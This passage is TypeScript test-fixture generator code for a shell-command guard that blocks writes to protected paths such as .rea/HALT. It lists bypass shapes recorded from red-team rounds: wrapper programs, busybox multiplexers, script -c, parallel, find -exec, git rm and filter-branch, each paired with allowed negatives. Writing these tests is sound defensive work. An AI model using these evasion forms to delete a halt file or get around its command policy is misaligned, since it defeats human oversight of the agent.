  // These MUST allow; they pin the false-positive boundary.
  type NegativeShape = {
    id: string;
    cmd: string;
  };
  const negatives: NegativeShape[] = [
    // PoC negative — pure echo, no cmdsubst.
    { id: 'dq-plain-echo', cmd: 'bash -c "echo \\"hello world\\""' },
    // Escaped `$` followed by no parens — literal $.
    { id: 'dq-escaped-dollar-only', cmd: 'bash -c "echo \\\\$"' },
    // Escaped `` ` `` followed by no closing — literal backtick.
    { id: 'dq-escaped-backtick-only', cmd: 'bash -c "echo \\\\\\`"' },
    // SQ-quoted body — bash does NOT process escapes inside SQ.
    { id: 'sq-body', cmd: "bash -c 'echo hello'" },
    // bash -c with simple $VAR (not cmdsubst) — allow.
    { id: 'dq-paramexp-only', cmd: 'bash -c "echo \\"\\$X\\""' },
    // Nested DQ around literal text — no cmdsubst.
    { id: 'dq-nested-literal', cmd: 'bash -c "printf \\"%s\\\\n\\" foo"' },
    // bash -c writing to a non-protected path via cmdsubst — allow.
    {
      id: 'dq-cmdsubst-non-protected',
      cmd: 'bash -c "echo \\"\\$(rm /tmp/safe.log)\\""',
    },
    // sh -c writing to a non-protected path via DQ-escape.
    {
      id: 'sh-dq-cmdsubst-non-protected',
      cmd: 'sh -c "echo \\"\\$(rm /tmp/other.log)\\""',
    },
  ];
  for (const n of negatives) {
    fixtures.push({
      cmd: n.cmd,
      expect: 'allow',
      klass: 'P-neg',
      label: n.id,
      rationale: `Round-8 negative — ${n.id} contains no protected-target write`,
    });
  }

  return { fixtures, skipped: [] };
}

/**
 * Class Q — wrapper-shell-exec bypass corpus (codex round 9 F1).
 *
 * Every process-launching wrapper × every shell × every protected
 * target must BLOCK. The wrappers themselves are transparent — they
 * fork/exec the next argv as the "real" command. Pre-fix walker.ts
 * `stripEnvAndModifiers` didn't strip them, so the head-dispatch saw
 * the wrapper name and missed the inner shell.
 *
 * Negative pinning: the same wrappers against non-protected targets
 * must ALLOW (the wrapper is not the policy trigger).
 *
 * Variants per fixture:
 *   - bare wrapper: `<wrapper> bash -c "rm <target>"`
 *   - flag-bearing: `<wrapper> [-FLAGS] bash -c "rm <target>"`
 *   - one-arg form: `<wrapper> ARG bash -c "rm <target>"`
 *   - abs-path:    `/usr/bin/<wrapper> bash -c "rm <target>"`
 */
function classQ(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  // Each wrapper specifies its arity and a "prefix" producer that
  // generates the wrapper-tokens-up-to-and-including-its-args. The
  // composer appends `<shell> -c "rm <target>"`.
  type Wrapper = {
    id: string;
    /** Bare form: just the wrapper name. */
    bare: string;
    /** Optional flag-bearing variant. */
    flagged?: string;
    /** Optional one-arg variant (where the wrapper requires one positional). */
    oneArg?: string;
    /** Absolute-path variant. */
    abs?: string;
  };

  const wrappers: Wrapper[] = [
    // No-arg wrappers.
    { id: 'nice', bare: 'nice', flagged: 'nice -n 5', abs: '/usr/bin/nice' },
    {
      id: 'ionice',
      bare: 'ionice',
      flagged: 'ionice -c 2 -n 0',
      abs: '/usr/bin/ionice',
    },
    { id: 'unbuffer', bare: 'unbuffer', abs: '/usr/bin/unbuffer' },
    { id: 'setsid', bare: 'setsid', flagged: 'setsid -w', abs: '/usr/bin/setsid' },
    {
      id: 'pkexec',
      bare: 'pkexec',
      flagged: 'pkexec --user root',
      abs: '/usr/bin/pkexec',
    },
    { id: 'firejail', bare: 'firejail', abs: '/usr/bin/firejail' },
    { id: 'bwrap', bare: 'bwrap', abs: '/usr/bin/bwrap' },
    { id: 'proot', bare: 'proot', abs: '/usr/local/bin/proot' },
    { id: 'numactl', bare: 'numactl', abs: '/usr/bin/numactl' },

    // One-arg wrappers.
    {
      id: 'timeout',
      bare: 'timeout 1',
      oneArg: 'timeout --preserve-status 5',
      flagged: 'timeout -k 1 5',
      abs: '/usr/bin/timeout 1',
    },
    {
      id: 'chrt',
      bare: 'chrt 1',
      oneArg: 'chrt -r 50',
      flagged: 'chrt -f 99',
      abs: '/usr/bin/chrt 1',
    },
    { id: 'taskset', bare: 'taskset 1', flagged: 'taskset -c 0', abs: '/usr/bin/taskset 1' },
    { id: 'sg', bare: 'sg root', abs: '/usr/bin/sg root' },
    { id: 'newgrp', bare: 'newgrp users', abs: '/usr/bin/newgrp users' },
    { id: 'cgexec', bare: 'cgexec foo', abs: '/usr/bin/cgexec foo' },

    // Subcommand wrappers.
    {
      id: 'systemd-run',
      bare: 'systemd-run',
      flagged: 'systemd-run --user --scope',
      abs: '/usr/bin/systemd-run',
    },
    {
      id: 'flatpak-run',
      bare: 'flatpak run',
      flagged: 'flatpak run --filesystem=home',
      abs: '/usr/bin/flatpak run',
    },

    // Re-parse seam wrappers (su/runuser variants).
    { id: 'su', bare: 'su user', abs: '/usr/bin/su user' },
    { id: 'runuser', bare: 'runuser user', abs: '/usr/sbin/runuser user' },

    // env wrappers.
    { id: 'env-dashdash', bare: 'env --', abs: '/usr/bin/env --' },

    // Flag-prefixed wrappers.
    { id: 'stdbuf', bare: 'stdbuf -i0', flagged: 'stdbuf -o0 -e0', abs: '/usr/bin/stdbuf -i0' },
    {
      id: 'setpriv',
      bare: 'setpriv --reuid=1000',
      flagged: 'setpriv --reuid=1000 --regid=1000 --clear-groups',
    },
  ];

  const SHELLS = ['bash', 'sh', 'zsh', 'dash', 'ksh', 'ash'] as const;
  type WrapperVariantKey = 'bare' | 'flagged' | 'oneArg' | 'abs';
  const variantKeys: WrapperVariantKey[] = ['bare', 'flagged', 'oneArg', 'abs'];

  for (const wrapper of wrappers) {
    for (const variant of variantKeys) {
      const prefix = wrapper[variant];
      if (prefix === undefined) continue;
      for (const shell of SHELLS) {
        for (const target of PROTECTED_TARGETS) {
          fixtures.push({
            cmd: `${prefix} ${shell} -c "rm ${target}"`,
            expect: 'block',
            klass: 'Q',
            label: `wrap-${wrapper.id}-${variant}-${shell}-${target.replace(/[^a-z0-9]/gi, '_')}`,
            rationale: `Round-9 F1 wrapper-shell-exec — ${wrapper.id}(${variant}) + ${shell} -c → rm ${target} must BLOCK`,
          });
        }
        // Negative: same wrapper + shell, but target is non-protected.
        // Sample only ONE shell per wrapper variant to keep the corpus
        // size manageable.
        if (shell === 'bash') {
          for (const negTarget of NEGATIVE_TARGETS.slice(0, 2)) {
            fixtures.push({
              cmd: `${prefix} ${shell} -c "rm ${negTarget}"`,
              expect: 'allow',
              klass: 'Q-neg',
              label: `wrap-neg-${wrapper.id}-${variant}-${shell}-${negTarget.replace(/[^a-z0-9]/gi, '_')}`,
              rationale: `Round-9 F1 negative — ${wrapper.id} wrapping ${shell} -c against non-protected ${negTarget} must ALLOW`,
            });
          }
        }
      }
    }
  }

  // Negative: same wrappers WITHOUT the inner shell — they should be
  // ignored by the dispatcher (the wrapper is transparent; without
  // an inner write the verdict is allow).
  const innocent = ['ls', 'echo hello', 'true', 'pwd'];
  for (const wrapper of wrappers) {
    const prefix = wrapper.bare;
    for (const inn of innocent) {
      fixtures.push({
        cmd: `${prefix} ${inn}`,
        expect: 'allow',
        klass: 'Q-neg',
        label: `wrap-neg-${wrapper.id}-innocent-${inn.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `Round-9 F1 negative — ${wrapper.id} ${inn} must ALLOW (no protected write)`,
      });
    }
  }

  return { fixtures, skipped: [] };
}

/**
 * Class R — busybox/toybox multiplexer corpus (codex round 9 F2).
 *
 * busybox (and the API-compatible toybox) is a single-binary
 * multiplexer that dispatches to an applet based on argv[1]. Pre-fix
 * walker.ts's head-dispatch ignored the multiplexer head, so
 * `busybox rm .rea/HALT` slipped past — the dispatcher saw `busybox`
 * with no case and emitted nothing.
 *
 * Variants:
 *   - direct applet:     `busybox rm <target>`, `busybox dd of=<target>`, etc.
 *   - shell applet:      `busybox sh -c "rm <target>"`, `busybox ash -c "..."`
 *   - dashdash separator: `busybox -- rm <target>`
 *   - abs-path:           `/bin/busybox rm <target>`
 *   - toybox parity:      same shapes with `toybox` head
 */
function classR(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  // Per-applet write builder. Uses builder-style closures so a single
  // fixture can target ANY protected target through the same shape.
  type AppletWrite = { applet: string; build: (target: string) => string };
  const appletWrites: AppletWrite[] = [
    { applet: 'rm', build: (t) => `rm ${t}` },
    { applet: 'rm-rf', build: (t) => `rm -rf ${t}` },
    { applet: 'cp', build: (t) => `cp /tmp/x ${t}` },
    { applet: 'mv', build: (t) => `mv /tmp/x ${t}` },
    { applet: 'dd', build: (t) => `dd of=${t}` },
    { applet: 'tee', build: (t) => `tee ${t}` },
    { applet: 'truncate', build: (t) => `truncate -s 0 ${t}` },
    { applet: 'ln', build: (t) => `ln -sf /tmp/x ${t}` },
    { applet: 'touch', build: (t) => `touch ${t}` },
    { applet: 'chmod', build: (t) => `chmod 000 ${t}` },
    { applet: 'redirect', build: (t) => `printf x > ${t}` },
  ];

  // Shell-applet builder for `busybox sh -c "..."` and ash variant.
  type ShellAppletWrite = { applet: string; build: (target: string) => string };
  const shellApplets: ShellAppletWrite[] = [
    { applet: 'sh', build: (t) => `sh -c "rm ${t}"` },
    { applet: 'ash', build: (t) => `ash -c "rm ${t}"` },
  ];

  const MUXES = ['busybox', 'toybox'] as const;
  type SeparatorVariant = 'direct' | 'dashdash' | 'abs';
  const separators: Array<{ id: SeparatorVariant; mk: (mux: string) => string }> = [
    { id: 'direct', mk: (mux) => mux },
    { id: 'dashdash', mk: (mux) => `${mux} --` },
    { id: 'abs', mk: (mux) => `/bin/${mux}` },
  ];

  for (const mux of MUXES) {
    for (const sep of separators) {
      const prefix = sep.mk(mux);
      // Direct applet writes.
      for (const apw of appletWrites) {
        for (const target of PROTECTED_TARGETS) {
          // ln/cp/mv/dd/tee/truncate work on files; redirect-form
          // works on any. Skip impossible combos (e.g. rm-rf on a
          // file is allowed — rm -rf .rea/HALT just deletes the file).
          fixtures.push({
            cmd: `${prefix} ${apw.build(target)}`,
            expect: 'block',
            klass: 'R',
            label: `mux-${mux}-${sep.id}-${apw.applet}-${target.replace(/[^a-z0-9]/gi, '_')}`,
            rationale: `Round-9 F2 ${mux}(${sep.id}) + ${apw.applet} → ${target} must BLOCK`,
          });
        }
        // Negative: same shape against non-protected target. Sample
        // first non-protected target only.
        const negT = NEGATIVE_TARGETS[0];
        if (negT !== undefined && sep.id === 'direct') {
          fixtures.push({
            cmd: `${prefix} ${apw.build(negT)}`,
            expect: 'allow',
            klass: 'R-neg',
            label: `mux-neg-${mux}-${sep.id}-${apw.applet}-${negT.replace(/[^a-z0-9]/gi, '_')}`,
            rationale: `Round-9 F2 negative — ${mux} + ${apw.applet} → ${negT} must ALLOW`,
          });
        }
      }
      // Shell applets — re-parse seam through nested shell.
      for (const sap of shellApplets) {
        for (const target of PROTECTED_TARGETS) {
          fixtures.push({
            cmd: `${prefix} ${sap.build(target)}`,
            expect: 'block',
            klass: 'R',
            label: `mux-shell-${mux}-${sep.id}-${sap.applet}-${target.replace(/[^a-z0-9]/gi, '_')}`,
            rationale: `Round-9 F2 ${mux}(${sep.id}) + ${sap.applet} -c → rm ${target} must BLOCK`,
          });
        }
      }
    }
  }

  // Negatives — innocent multiplexer invocations.
  const innocent = ['ls', 'echo hello', 'true', 'pwd', 'sh -c "echo ok"'];
  for (const mux of MUXES) {
    for (const inn of innocent) {
      fixtures.push({
        cmd: `${mux} ${inn}`,
        expect: 'allow',
        klass: 'R-neg',
        label: `mux-neg-${mux}-innocent-${inn.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `Round-9 F2 negative — ${mux} ${inn} must ALLOW`,
      });
    }
  }

  // Defensive: nested multiplexer (refuse on uncertainty path).
  // `busybox busybox rm .rea/HALT` — second multiplexer halts strip;
  // the fail-closed structural defense (literal `rm` head) still
  // catches the destination.
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `busybox busybox rm ${target}`,
      expect: 'block',
      klass: 'R',
      label: `mux-nested-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `Round-9 F2 nested busybox — fail-closed dispatcher still blocks via direct rm`,
    });
  }

  return { fixtures, skipped: [] };
}

/**
 * Class S — round-10 wrapper-class extensions (chronic, dbus-launch,
 * watch, script, parallel). Codex round 10 surfaced these 5 wrappers
 * as round-9 F1 misses. Each is enumerated explicitly in
 * `walker.ts`'s `stripEnvAndModifiers` for clean dispatch, and the
 * structural wrapper-shell-exec guard at `walkCallExpr`'s `default:`
 * case provides the safety net for any future unknown wrapper.
 *
 * Per-wrapper variants: bare, with-flags, with-positional, abs-path
 * (where applicable). Each combined with `bash`/`sh`/`zsh`/`busybox
 * sh` shell-exec forms against every protected target.
 *
 * `script` is the unique re-parse seam (`-c PAYLOAD` mirrors `su -c
 * PAYLOAD`); `parallel` has the `:::` input separator. Both are
 * tested in a class-S sub-block.
 */
function classS(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  type Wrapper = {
    id: string;
    bare: string;
    flagged?: string;
    abs?: string;
  };

  // Wrappers that re-parse a -c-style payload OR transparently exec a
  // shell positional. parallel + script are handled in a separate
  // block below because their shapes diverge (input separator,
  // re-parse-from-flag).
  const wrappers: Wrapper[] = [
    { id: 'chronic', bare: 'chronic', abs: '/usr/bin/chronic' },
    {
      id: 'dbus-launch',
      bare: 'dbus-launch',
      flagged: 'dbus-launch --exit-with-session',
      abs: '/usr/bin/dbus-launch',
    },
    {
      id: 'watch',
      bare: 'watch',
      flagged: 'watch -n 1',
      abs: '/usr/bin/watch',
    },
  ];

  const SHELLS = ['bash', 'sh', 'zsh', 'dash', 'ksh', 'ash'] as const;
  type WrapperVariantKey = 'bare' | 'flagged' | 'abs';
  const variantKeys: WrapperVariantKey[] = ['bare', 'flagged', 'abs'];

  for (const wrapper of wrappers) {
    for (const variant of variantKeys) {
      const prefix = wrapper[variant];
      if (prefix === undefined) continue;
      for (const shell of SHELLS) {
        for (const target of PROTECTED_TARGETS) {
          fixtures.push({
            cmd: `${prefix} ${shell} -c "rm ${target}"`,
            expect: 'block',
            klass: 'S',
            label: `s-wrap-${wrapper.id}-${variant}-${shell}-${target.replace(/[^a-z0-9]/gi, '_')}`,
            rationale: `Round-10 ${wrapper.id}(${variant}) + ${shell} -c → rm ${target} must BLOCK (wrapper enumeration + structural guard parity)`,
          });
        }
        // Negative — only for `bash` to keep corpus tractable.
        if (shell === 'bash') {
          for (const negTarget of NEGATIVE_TARGETS.slice(0, 2)) {
            fixtures.push({
              cmd: `${prefix} ${shell} -c "rm ${negTarget}"`,
              expect: 'allow',
              klass: 'S-neg',
              label: `s-wrap-neg-${wrapper.id}-${variant}-${shell}-${negTarget.replace(/[^a-z0-9]/gi, '_')}`,
              rationale: `Round-10 negative — ${wrapper.id} + ${shell} -c against non-protected ${negTarget} must ALLOW`,
            });
          }
        }
      }
    }
  }

  // `script -c PAYLOAD [TYPESCRIPT]` re-parse seam. Includes both
  // forms: with and without trailing typescript-file positional.
  const scriptVariants = [
    { id: 'short', prefix: 'script', tail: ' /tmp/typescript' },
    { id: 'short-no-tail', prefix: 'script', tail: '' },
    { id: 'long', prefix: 'script --command', tail: ' /tmp/typescript' },
    { id: 'long-eq', prefix: 'script', tail: ' /tmp/typescript', useEq: true },
    { id: 'flagged', prefix: 'script -a -q', tail: ' /tmp/typescript' },
    { id: 'abs', prefix: '/usr/bin/script', tail: '' },
  ];
  for (const v of scriptVariants) {
    for (const target of PROTECTED_TARGETS) {
      // Three argv shapes for the script wrapper: `--command`
      // separate-arg form (prefix already ends in `--command`),
      // `--command=PAYLOAD` joined form, and the bare `-c PAYLOAD`
      // short form.
      const shapeCmd =
        v.id === 'long'
          ? `${v.prefix} "rm ${target}"${v.tail}`
          : v.useEq
            ? `script --command="rm ${target}"${v.tail}`
            : `${v.prefix} -c "rm ${target}"${v.tail}`;
      fixtures.push({
        cmd: shapeCmd,
        expect: 'block',
        klass: 'S',
        label: `s-script-${v.id}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `Round-10 script(${v.id}) → rm ${target} must BLOCK (re-parse seam)`,
      });
    }
  }
  // Negative — script with innocent payload.
  for (const negTarget of NEGATIVE_TARGETS.slice(0, 2)) {
    fixtures.push({
      cmd: `script -c "rm ${negTarget}" /tmp/typescript`,
      expect: 'allow',
      klass: 'S-neg',
      label: `s-script-neg-${negTarget.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `Round-10 negative — script -c against non-protected ${negTarget} must ALLOW`,
    });
  }
  // Negative — script without -c (just records to typescript file).
  fixtures.push({
    cmd: `script /tmp/typescript`,
    expect: 'allow',
    klass: 'S-neg',
    label: `s-script-no-c-tail`,
    rationale: `Round-10 negative — script without -c records to file; no inner cmd; allow`,
  });
  fixtures.push({
    cmd: `script`,
    expect: 'allow',
    klass: 'S-neg',
    label: `s-script-bare`,
    rationale: `Round-10 negative — bare script; no inner cmd; allow`,
  });

  // `parallel` with `:::` separator — inputs are positional args to
  // the template head.
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `parallel rm ::: ${target}`,
      expect: 'block',
      klass: 'S',
      label: `s-parallel-rm-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `Round-10 parallel rm ::: ${target} must BLOCK (input substituted into template head)`,
    });
    fixtures.push({
      cmd: `parallel touch ::: ${target}`,
      expect: 'block',
      klass: 'S',
      label: `s-parallel-touch-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `Round-10 parallel touch ::: ${target} must BLOCK`,
    });
    fixtures.push({
      cmd: `parallel -j 4 rm ::: ${target}`,
      expect: 'block',
      klass: 'S',
      label: `s-parallel-jflag-rm-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `Round-10 parallel -j 4 rm ::: ${target} must BLOCK (flag-stripped)`,
    });
    fixtures.push({
      cmd: `parallel --jobs=4 rm ::: ${target}`,
      expect: 'block',
      klass: 'S',
      label: `s-parallel-jobs-rm-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `Round-10 parallel --jobs=4 rm ::: ${target} must BLOCK`,
    });
    fixtures.push({
      cmd: `parallel ::: ::: ${target}`,
      expect: 'allow',
      klass: 'S-neg',
      label: `s-parallel-no-template-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `Round-10 parallel ::: ::: ${target} (no template) — defaults to echo, allow`,
    });
  }
  // `parallel` Cartesian product `::: A B ::: X Y`.
  fixtures.push({
    cmd: `parallel rm ::: ${PROTECTED_TARGETS[0]} ::: somefile`,
    expect: 'block',
    klass: 'S',
    label: `s-parallel-cartesian`,
    rationale: `Round-10 parallel rm ::: TGT ::: extra (Cartesian product) — TGT still flagged`,
  });
  // Negative parallel — innocent target.
  for (const negTarget of NEGATIVE_TARGETS.slice(0, 2)) {
    fixtures.push({
      cmd: `parallel rm ::: ${negTarget}`,
      expect: 'allow',
      klass: 'S-neg',
      label: `s-parallel-neg-rm-${negTarget.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `Round-10 negative — parallel rm ::: ${negTarget} must ALLOW`,
    });
  }

  // Class S innocent forms — wrappers without protected interaction.
  const innocent = ['ls', 'echo hello', 'true', 'pwd'];
  for (const wrapper of wrappers) {
    for (const inn of innocent) {
      fixtures.push({
        cmd: `${wrapper.bare} ${inn}`,
        expect: 'allow',
        klass: 'S-neg',
        label: `s-wrap-neg-${wrapper.id}-innocent-${inn.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `Round-10 ${wrapper.id} ${inn} must ALLOW (no protected write)`,
      });
    }
  }

  return { fixtures, skipped: [] };
}

/**
 * Class T — structural wrapper-shell-exec guard verification. Uses
 * synthetic-wrapper names (`xfooblar`, `unknownwrap1234`, etc.) to
 * verify the guard catches the bypass shape REGARDLESS of whether
 * the wrapper is enumerated in `stripEnvAndModifiers`.
 *
 * The structural guard runs in `walkCallExpr`'s `default:` case
 * (head not in dispatcher's allow-list). If it fires correctly,
 * even a never-before-seen wrapper that fork/exec's `bash -c
 * PAYLOAD` is caught.
 *
 * Class T-neg covers introspection / output utilities that mention
 * a shell name as DATA (man bash, which bash, echo bash) — these
 * must NOT trip the guard.
 */
function classT(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  // Synthetic wrapper names — guaranteed not in any allow-list.
  const SYNTH_WRAPPERS = [
    'xfooblar',
    'unknownwrap1234',
    'novel_wrapper',
    'futurewrapper',
    'expectx',
    'dtruss',
    'xtrace',
  ];
  const SHELLS = ['bash', 'sh', 'zsh', 'dash', 'ksh', 'ash'] as const;

  // Class T positive — synthetic wrapper invokes shell -c PAYLOAD
  // against protected target.
  for (const w of SYNTH_WRAPPERS) {
    for (const shell of SHELLS) {
      for (const target of PROTECTED_TARGETS) {
        fixtures.push({
          cmd: `${w} ${shell} -c "rm ${target}"`,
          expect: 'block',
          klass: 'T',
          label: `t-synth-${w}-${shell}-${target.replace(/[^a-z0-9]/gi, '_')}`,
          rationale: `Round-10 structural guard — ${w} (unknown) + ${shell} -c → rm ${target} must BLOCK`,
        });
      }
    }
    // Synthetic wrapper with one flag before the shell.
    for (const target of PROTECTED_TARGETS) {
      fixtures.push({
        cmd: `${w} -flag bash -c "rm ${target}"`,
        expect: 'block',
        klass: 'T',
        label: `t-synth-flagged-${w}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `Round-10 structural guard — ${w} -flag + bash -c → ${target}`,
      });
    }
    // Synthetic wrapper with TWO flags before the shell.
    for (const target of PROTECTED_TARGETS) {
      fixtures.push({
        cmd: `${w} --foo --bar=1 bash -c "rm ${target}"`,
        expect: 'block',
        klass: 'T',
        label: `t-synth-2flags-${w}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `Round-10 structural guard — ${w} with two flags + bash -c → ${target}`,
      });
    }
    // Synthetic wrapper with -c-style cluster after shell — `bash
    // -lc PAYLOAD`, `bash -ic PAYLOAD`.
    for (const cluster of ['-lc', '-ic', '-cl']) {
      for (const target of PROTECTED_TARGETS) {
        fixtures.push({
          cmd: `${w} bash ${cluster} "rm ${target}"`,
          expect: 'block',
          klass: 'T',
          label: `t-synth-cluster-${cluster.slice(1)}-${w}-${target.replace(/[^a-z0-9]/gi, '_')}`,
          rationale: `Round-10 structural guard — ${w} bash ${cluster} → ${target}`,
        });
      }
    }
  }

  // Class T defensive — synthetic wrapper invokes BARE shell (no
  // -c). Refuse on uncertainty (bare shell reads stdin).
  for (const w of SYNTH_WRAPPERS.slice(0, 3)) {
    for (const shell of SHELLS.slice(0, 2)) {
      fixtures.push({
        cmd: `${w} ${shell}`,
        expect: 'block',
        klass: 'T',
        label: `t-synth-bare-shell-${w}-${shell}`,
        rationale: `Round-10 structural guard — ${w} ${shell} (no -c) refuses on uncertainty (stdin read)`,
      });
    }
  }

  // Class T-neg — false-positive guards. Introspection / output /
  // path-lookup commands taking shell names as DATA must ALLOW.
  const INTROSPECTION_FORMS = [
    'man bash',
    'man bash -c',
    'info bash',
    'apropos bash',
    'whatis bash',
    'which bash',
    'which bash -c',
    'type bash',
    'whence bash',
    'whereis bash',
    'echo bash',
    'echo bash -c hello',
    'echo "bash -c"',
    `printf "running %s\\n" bash`,
    'help bash',
    'alias mybash=bash',
    'compgen -c bash',
  ];
  for (const cmd of INTROSPECTION_FORMS) {
    fixtures.push({
      cmd,
      expect: 'allow',
      klass: 'T-neg',
      label: `t-neg-introspection-${cmd.replace(/[^a-z0-9]/gi, '_').slice(0, 40)}`,
      rationale: `Round-10 false-positive guard — introspection form must ALLOW: ${cmd}`,
    });
  }

  // Class T-neg — synthetic wrapper with introspection in arg1.
  // `xfooblar echo bash` looks like the bypass shape but should
  // ALLOW because argv[1] is an introspection head (echo).
  for (const w of SYNTH_WRAPPERS.slice(0, 3)) {
    fixtures.push({
      cmd: `${w} echo bash`,
      expect: 'allow',
      klass: 'T-neg',
      label: `t-neg-arg1-introspection-${w}`,
      rationale: `Round-10 false-positive guard — ${w} echo bash (arg1=echo introspection) must ALLOW`,
    });
    fixtures.push({
      cmd: `${w} printf "%s\\n" bash`,
      expect: 'allow',
      klass: 'T-neg',
      label: `t-neg-arg1-printf-${w}`,
      rationale: `Round-10 false-positive guard — ${w} printf "...\\n" bash must ALLOW`,
    });
  }

  // Class T-neg — synthetic wrapper without any shell positional.
  // No structural-guard match, no detection.
  for (const w of SYNTH_WRAPPERS.slice(0, 3)) {
    fixtures.push({
      cmd: `${w} ls -la`,
      expect: 'allow',
      klass: 'T-neg',
      label: `t-neg-no-shell-${w}-ls`,
      rationale: `Round-10 ${w} ls -la (no shell positional) must ALLOW`,
    });
    fixtures.push({
      cmd: `${w} pwd`,
      expect: 'allow',
      klass: 'T-neg',
      label: `t-neg-no-shell-${w}-pwd`,
      rationale: `Round-10 ${w} pwd (no shell positional) must ALLOW`,
    });
  }

  return { fixtures, skipped: [] };
}

/**
 * Class U — codex round 11 P0/P1 closures: find -exec `{}` placeholder
 * (F11-1), git rm/mv & history-rewrite seams (F11-2/F11-3), archive
 * extraction (F11-4), parallel stdin (F11-5).
 *
 * Coverage strategy: cross-product every find predicate × `{}` × every
 * exec subform × every protected target. PoCs from the spec are first-
 * class fixtures so the runner traces back to round-11.
 */
function classU(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  // F11-1: find -exec/-execdir/-ok/-okdir with `{}` placeholder.
  const FIND_PREDICATES = [
    `-name HALT`,
    `-iname HALT`,
    `-path "./.rea/HALT"`,
    `-ipath "./.rea/HALT"`,
    `-path "*/.rea/*"`,
    `-name "*.yaml"`,
    `-type f`,
  ];
  const FIND_EXEC_FORMS = ['-exec', '-execdir', '-ok', '-okdir'];
  const FIND_TERMINATORS = [`\\;`, `+`];
  for (const pred of FIND_PREDICATES) {
    for (const exec of FIND_EXEC_FORMS) {
      for (const term of FIND_TERMINATORS) {
        for (const target of PROTECTED_TARGETS) {
          fixtures.push({
            cmd: `find . ${pred} ${exec} rm {} ${term}`,
            expect: 'block',
            klass: 'U',
            label: `u-find-${exec.slice(1)}-${term.replace(/[^a-z0-9]/gi, '_')}-${target.replace(/[^a-z0-9]/gi, '_')}`,
            rationale: `F11-1 find ${exec} {} ${term} with ${pred} → ${target} must BLOCK (placeholder unresolvable)`,
          });
        }
      }
    }
  }
  // F11-1 negatives — read-only inner head with `{}` must ALLOW.
  for (const exec of FIND_EXEC_FORMS) {
    fixtures.push({
      cmd: `find . -name "*.txt" ${exec} cat {} \\;`,
      expect: 'allow',
      klass: 'U-neg',
      label: `u-neg-find-${exec.slice(1)}-cat`,
      rationale: `F11-1 negative — read-only inner (cat) with {} must ALLOW`,
    });
    fixtures.push({
      cmd: `find . ${exec} grep -l foo {} \\;`,
      expect: 'allow',
      klass: 'U-neg',
      label: `u-neg-find-${exec.slice(1)}-grep`,
      rationale: `F11-1 negative — grep with {} must ALLOW`,
    });
  }
  // F11-1 negative — find without -exec/{} must ALLOW.
  fixtures.push({
    cmd: 'find . -name "*.md"',
    expect: 'allow',
    klass: 'U-neg',
    label: `u-neg-find-no-exec`,
    rationale: `F11-1 negative — bare find must ALLOW`,
  });

  // F11-2 git rm / git mv.
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `git rm -f ${target}`,
      expect: 'block',
      klass: 'U',
      label: `u-git-rm-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-2 git rm -f ${target} must BLOCK`,
    });
    fixtures.push({
      cmd: `git rm ${target}`,
      expect: 'block',
      klass: 'U',
      label: `u-git-rm-default-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-2 git rm ${target} (no flag) must BLOCK`,
    });
    fixtures.push({
      cmd: `git rm -- ${target}`,
      expect: 'block',
      klass: 'U',
      label: `u-git-rm-dashdash-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-2 git rm -- ${target} must BLOCK`,
    });
    fixtures.push({
      cmd: `git mv ${target} /tmp/x`,
      expect: 'block',
      klass: 'U',
      label: `u-git-mv-src-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-2 git mv ${target} /tmp/x must BLOCK (source removal)`,
    });
  }
  // F11-2 negatives — `git rm --cached` (no disk delete) and
  // ordinary `git rm` against non-protected files must ALLOW.
  fixtures.push({
    cmd: 'git rm --cached .rea/HALT',
    expect: 'allow',
    klass: 'U-neg',
    label: 'u-neg-git-rm-cached',
    rationale: 'F11-2 negative — git rm --cached does NOT delete from disk',
  });
  fixtures.push({
    cmd: 'git rm --cached -- .rea/HALT',
    expect: 'allow',
    klass: 'U-neg',
    label: 'u-neg-git-rm-cached-dashdash',
    rationale: 'F11-2 negative — git rm --cached --',
  });
  fixtures.push({
    cmd: 'git rm docs/note.md',
    expect: 'allow',
    klass: 'U-neg',
    label: 'u-neg-git-rm-non-protected',
    rationale: 'F11-2 negative — non-protected target',
  });
  fixtures.push({
    cmd: 'git mv docs/a.md docs/b.md',
    expect: 'allow',
    klass: 'U-neg',
    label: 'u-neg-git-mv-non-protected',
    rationale: 'F11-2 negative — non-protected mv',
  });

  // F11-3 git history-rewrite re-parse seams.
  const FILTER_FORMS = [
    '--tree-filter',
    '--index-filter',
    '--msg-filter',
    '--env-filter',
    '--commit-filter',
    '--parent-filter',
    '--tag-name-filter',
  ];
  for (const flag of FILTER_FORMS) {
    for (const target of PROTECTED_TARGETS) {
      fixtures.push({
        cmd: `git filter-branch ${flag} "rm -f ${target}" HEAD`,
        expect: 'block',
        klass: 'U',
        label: `u-filter-branch-${flag.slice(2)}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `F11-3 git filter-branch ${flag} 'rm -f ${target}' must BLOCK`,
      });
      fixtures.push({
        cmd: `git filter-branch ${flag}="rm -f ${target}" HEAD`,
        expect: 'block',
        klass: 'U',
        label: `u-filter-branch-eq-${flag.slice(2)}-${target.replace(/[^a-z0-9]/gi, '_')}`,
